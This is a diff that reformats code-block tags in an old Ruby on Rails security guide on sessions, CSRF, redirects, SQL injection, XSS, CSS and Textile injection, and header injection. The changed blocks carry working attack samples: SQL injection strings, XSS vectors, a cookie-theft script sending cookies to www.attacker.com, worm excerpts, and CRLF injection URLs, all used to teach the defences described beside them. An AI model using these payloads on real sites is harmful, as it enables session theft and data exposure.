@@ -91,12 +91,12 @@ Rails 2 introduced a new default session storage, CookieStore. CookieStore saves
 
 That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA512, which has not been compromised, yet). So _(highlight)don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_. Put the secret in your environment.rb:
 
-<pre>
+<ruby>
 config.action_controller.session = {
   :key    => '_app_session',
   :secret => '0x0dkfj3927dkc7djdh36rkckdfzsg...'
 }
-</pre>
+</ruby>
 
 There are, however, derivatives of CookieStore which encrypt the session hash, so the client cannot see it.
 
@@ -211,9 +211,9 @@ If your web application is RESTful, you might be used to additional HTTP verbs, 
 
 _(highlight)The verify method in a controller can make sure that specific actions may not be used over GET_. Here is an example to verify the use of the transfer action over POST. If the action comes in using any other verb, it redirects to the list action.
 
-<pre>
+<ruby>
 verify :method => :post, :only => [:transfer], :redirect_to => {:action => :list}
-</pre>
+</ruby>
 
 With this precaution, the attack from above will not work, because the browser sends a GET request for images, which will not be accepted by the web application.
 
@@ -264,9 +264,9 @@ end
 
 This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can exploited by an attacker if he includes a host key in the URL:
 
-<pre>
+<plain>
 http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
-</pre>
+</plain>
 
 If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _(highlight)include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _(highlight)And if you redirect to an URL, check it with a whitelist or a regular expression_.
 
@@ -424,10 +424,10 @@ There are some authorization and authentication plug-ins for Rails available. A 
 
 Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):
 
-<pre>
+<plain>
 http://localhost:3006/user/activate
 http://localhost:3006/user/activate?id=
-</pre>
+</plain>
 
 This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:
 
@@ -437,9 +437,9 @@ User.find_by_activation_code(params[:id])
 
 If the parameter was nil, the resulting SQL query will be
 
-<pre>
+<sql>
 SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
-</pre>
+</sql>
 
 And thus it found the first user in the database, returned it and logged him in. You can find out more about it in "my blog post":http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/. _(highlight)It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
 
@@ -534,9 +534,9 @@ end
 
 This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added \^ and $ so that file name will contain these characters from the beginning to the end of the string. However, _(highlight)in Ruby ^ and $ matches the *line* beginning and line end_. And thus a file name like this passes the filter without problems:
 
-<pre>
+<plain>
 file.txt%0A<script>alert('hello')</script>
-</pre>
+</plain>
 
 Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n&lt;script&gt;alert('hello')&lt;/script&gt;". This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:
 
@@ -599,9 +599,9 @@ Project.find(:all, :conditions => "name = '#{params[:name]}'")
 
 This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1=1', the resulting SQL query will be:
 
-<pre>
+<sql>
 SELECT * FROM projects WHERE name = '' OR 1 --'
-</pre>
+</sql>
 
 The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.
 
@@ -615,9 +615,9 @@ User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password
 
 If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:
 
-<pre>
+<sql>
 SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
-</pre>
+</sql>
 
 This will simply find the first record in the database, and grants access to this user.
 
@@ -631,16 +631,16 @@ Project.find(:all, :conditions => "name = '#{params[:name]}'")
 
 And now let's inject another query using the UNION statement:
 
-<pre>
+<plain>
 ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
-</pre>
+</plain>
 
 This will result in the following SQL query:
 
-<pre>
+<sql>
 SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --')
-</pre>
+</sql>
 
 The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
 
@@ -686,36 +686,36 @@ The most common XSS language is of course the most popular client-side scripting
 
 Here is the most straightforward test to check for XSS:
 
-<pre>
+<html>
 <script>alert('Hello');</script>
-</pre>
+</html>
 
 This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:
 
-<pre>
+<html>
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
-</pre>
+</html>
 
 h6. Cookie theft
 
 These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:
 
-<pre>
+<plain>
 <script>document.write(document.cookie);</script>
-</pre>
+</plain>
 
 For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victims cookie.
 
-<pre>
+<html>
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
-</pre>
+</html>
 
 The log files on www.attacker.com will read like this:
 
-<pre>
+<plain>
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
-</pre>
+</plain>
 
 You can mitigate these attacks (in the obvious way) by adding the "httpOnly":http://dev.rubyonrails.org/ticket/8895 flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies "will still be visible using Ajax":http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/, though.
 
@@ -723,9 +723,9 @@ h6. Defacement
 
 With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:
 
-<pre>
+<html>
 <iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
-</pre>
+</html>
 
 This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iFrame is taken from an "actual attack":http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html on legitimate Italian sites using the "Mpack attack framework":http://isc.sans.org/diary.html?storyid=3015. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.
 
@@ -733,10 +733,10 @@ A more specialized attack could overlap the entire web site or display a login f
 
 Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
 
-<pre>
+<plain>
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
-</pre>
+</plain>
 
 h6. Countermeasures
 
@@ -746,16 +746,16 @@ Especially for XSS, it is important to do _(highlight)whitelist input filtering 
 
 Imagine a blacklist deletes “script” from the user input. Now the attacker injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
 
-<pre>
+<ruby>
 strip_tags("some<<b>script>alert('hello')<</b>/script>")
-</pre>
+</ruby>
 
 This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():
 
-<pre>
+<ruby>
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
-</pre>
+</ruby>
 
 This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
 
@@ -765,24 +765,24 @@ h6. Obfuscation and Encoding Injection
 
 Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:
 
-<pre>
+<html>
 <IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
   &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>
-</pre>
+</html>
 
 This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the "Hackvertor":http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php. Rails‘ sanitize() method does a good job to fend off encoding attacks.
 
 h5. Examples from the underground
 
-</pre> _In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
+_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
 
 The following is an excerpt from the "Js.Yamanner@m":http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1 Yahoo! Mail "worm":http://groovin.net/stuff/yammer.txt. It appeared on June 11, 2006 and was the first webmail interface worm:
 
-<pre>
+<html>
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
-</pre>
+</html>
 
 The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
 
@@ -800,27 +800,27 @@ CSS Injection is explained best by a well-known worm, the "MySpace Samy worm":ht
 
 MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:
 
-<pre>
+<html>
 <div style="background:url('javascript:alert(1)')">
-</pre>
+</html>
 
 So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript allows has a handy eval() function which executes any string as code.
 
-<pre>
+<html>
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
-</pre>
+</html>
 
 The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word “innerHTML”:
 
-<pre>
+<plain>
 alert(eval('document.body.inne' + 'rHTML'));
-</pre>
+</plain>
 
 The next problem was MySpace filtering the word “javascript”, so the author used “java&lt;NEWLINE&gt;script" to get around this:
 
-<pre>
+<html>
 <div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
-</pre>
+</html>
 
 Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.
 
@@ -839,24 +839,24 @@ h4. Textile Injection
 For example, RedCloth translates +_test_+ to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the "all-new version 4":http://www.redcloth.org that removed serious bugs. However, even that version has "some security bugs":http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html, so the countermeasures still apply. Here is an example for version 3.0.4:
 
 
-<pre>
->> RedCloth.new('<script>alert(1)</script>').to_html
-=> "<script>alert(1)</script>"
-</pre>
+<ruby>
+RedCloth.new('<script>alert(1)</script>').to_html
+# => "<script>alert(1)</script>"
+</ruby>
 
 Use the :filter_html option to remove HTML which was not created by the Textile processor.
 
-<pre>
->> RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
-=> "alert(1)"
-</pre>
+<ruby>
+RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
+# => "alert(1)"
+</ruby>
 
 However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:
 
-<pre>
->> RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
-=> "<p><a href="javascript:alert(1)">hello</a></p>"
-</pre>
+<ruby>
+RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
+# => "<p><a href="javascript:alert(1)">hello</a></p>"
+</ruby>
 
 h5. Countermeasures
 
@@ -882,10 +882,10 @@ If your application has to execute commands in the underlying operating system, 
 
 A countermeasure is to _(highlight)use the +system(command, parameters)+ method which passes command line parameters safely_.
 
-<pre>
+<ruby>
 system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files
-</pre>
+</ruby>
 
 
 h4. Header Injection
@@ -896,30 +896,30 @@ HTTP request headers have a Referer, User-Agent (client software), and Cookie fi
 
 Besides that, it is _(highlight)important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:
 
-<pre>
+<ruby>
 redirect_to params[:referer]
-</pre>
+</ruby>
 
 What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:
 
-<pre>
+<plain>
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
-</pre>
+</plain>
 
 And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:
 
-<pre>
+<plain>
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
-</pre>
+</plain>
 
 Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.
 
-<pre>
+<plain>
 HTTP/1.1 302 Moved Temporarily
 (...)
 Location: http://www.malicious.tld
-</pre>
+</plain>
 
 So _(highlight)attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the +redirect_to+ method. _(highlight)Make sure you do it yourself when you build other header fields with user input._
 
@@ -927,7 +927,7 @@ h5. Response Splitting
 
 If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:
 
-<pre>
+<plain>
 HTTP/1.1 302 Found [First standard 302 response]
 Date: Tue, 12 Apr 2005 22:09:07 GMT
 Location: Content-Type: text/html
@@ -942,7 +942,7 @@ Keep-Alive: timeout=15, max=100         shown as the redirected page]
 Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
-</pre>
+</plain>
 
 Under certain circumstances this would present the malicious HTML to the victim. However, this seems to work with Keep-Alive connections, only (and many browsers are using one-time connections). But you can't rely on this. _(highlight)In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._
 
